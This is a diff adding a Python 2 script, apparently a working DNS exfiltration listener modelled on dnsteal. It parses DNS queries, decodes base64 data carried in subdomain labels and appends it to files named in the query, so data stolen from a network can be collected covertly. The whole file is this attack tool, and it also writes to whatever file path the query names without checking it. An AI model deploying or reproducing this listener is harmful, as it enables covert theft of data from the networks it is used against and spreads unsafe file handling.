@@ -1,0 +1,156 @@
+# /usr/bin/env python
+
+# Written by Cory Schwartz
+# Inspired by https://github.com/m57/dnsteal
+
+# Just for reference, the following diagrams
+# are taken from RFC1035:
+# DNS Packet header format
+#                                    1  1  1  1  1  1
+#      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                      ID                       |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                    QDCOUNT                    |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                    ANCOUNT                    |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                    NSCOUNT                    |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                    ARCOUNT                    |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+
+# Question format:
+#                                    1  1  1  1  1  1
+#      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                                               |
+#    /                     QNAME                     /
+#    /                                               /
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                     QTYPE                     |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                     QCLASS                    |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+
+# Resource Record format:
+#                                    1  1  1  1  1  1
+#      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                                               |
+#    /                                               /
+#    /                      NAME                     /
+#    |                                               |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                      TYPE                     |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                     CLASS                     |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                      TTL                      |
+#    |                                               |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+#    |                   RDLENGTH                    |
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
+#    /                     RDATA                     /
+#    /                                               /
+#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+
+import base64
+from SocketServer import BaseRequestHandler, UDPServer
+
+class DNSParser:
+    "Parse DNS requests"
+    def __init__(self, raw):
+        self.raw = raw
+    @property
+    def header(self):
+        "Break out header fields from DNS packet"
+        ID = self.raw[:2]
+        QR = (ord(self.raw[2]) >>7) & 1
+        OPCODE = (ord(self.raw[2]) >> 3) & 15
+        AA = (ord(self.raw[2]) >> 2) & 1
+        TC = (ord(self.raw[2]) >> 1) & 1
+        RD = ord(self.raw[2]) & 1
+        RA = (ord(self.raw[3]) >> 7) & 1
+        Z = (ord(self.raw[3]) >> 4) & 7
+        RCODE = ord(self.raw[3]) & 15
+        QDCOUNT = self.raw[4:6]
+        ANCOUNT = self.raw[6:8]
+        NSCOUNT = self.raw[8:10]
+        ARCOUNT = self.raw[10:12]
+        ret = locals()
+        del(ret['self'])
+        return ret
+    @property
+    def question(self):
+        "Break out question section of DNS packet"
+        questions = []
+        raw_questions = ''
+        length_byte = 12
+        length = ord(self.raw[length_byte])
+        while length > 0:
+            next_byte = length_byte + length + 1
+            questions.append(self.raw[length_byte + 1:next_byte])
+            raw_questions += self.raw[length_byte : next_byte]
+            length_byte = next_byte
+            length = ord(self.raw[length_byte])
+        QTYPE = self.raw[length_byte + 1:length_byte + 3]
+        QCLASS = self.raw[length_byte + 3 : length_byte + 5]
+        raw_questions += '\x00' + QTYPE + QCLASS
+        return {"QTYPE": QTYPE, "QCLASS": QCLASS, 'raw_questions': raw_questions,
+            "questions": questions}
+    def A_record(self, ip):
+        return str.join('',map(lambda x: chr(int(x)), ip.split('.')))
+    def mk_response(self, response_data):
+        '''
+        params: response_data:
+        returns: raw binary DNS response.
+        Rdata processor is chosen dynamically depending on the question type
+        '''
+        # Did I say dynamic?
+        # Maybe one day implement more than just A records
+        rdata_processor = self.A_record
+        packet = ''
+        # Header:
+        packet += self.header['ID']
+        packet += '\x85\x80' # QR/Opcode/AA/TC/RD/RA/Z/RCODE
+        packet += '\x00\x01' # QDCOUNT (1)
+        packet += '\x00\x01' # ANCOUNT (1)
+        packet += '\x00\x00' # NSCOUNT (0)
+        packet += '\x00\x00' # ARCOUNT (0)
+        # Question Section
+        packet += self.question['raw_questions']
+        #Response Section
+        packet +='\xc0\x0c'  # "compressed" Pointer to byte 12, the question section
+        packet += self.question['QTYPE']
+        packet += self.question['QCLASS']
+        packet += '\x00\x00\x00\x00' # TTL (Don't cache)
+        packet += '\x00\x04' # Length, 32 Only support A records, after all.
+        # Rdata:
+        packet += rdata_processor(response_data)
+        return packet
+
+class Exfiltrator(BaseRequestHandler):
+    '''
+    Use subdomains to exfiltrate data from DNS querries.
+    The first two parts of the domain will be used to send data
+    and the file name. The data will be base64 binary encoded.
+    Except for the first two, the remaining parts of the domain
+    will be ignored, so DNS should be configured up to that point.
+    <data>.<filename>.real.domain.com
+    '''
+    def handle(self):
+        dnsrequest= DNSParser(self.request[0])
+        socket = self.request[1]
+        data = dnsrequest.question['questions'][0]
+        filename = dnsrequest.question['questions'][1]
+        with open(filename, 'a+b') as f:
+            f.write(base64.b64decode(data))
+        socket.sendto(dnsrequest.mk_response('10.10.10.10'), self.client_address)
+
+if __name__ == '__main__':
+    HOST, PORT = '0.0.0.0', 53
+    server = UDPServer((HOST, PORT), Exfiltrator)
+    server.serve_forever()
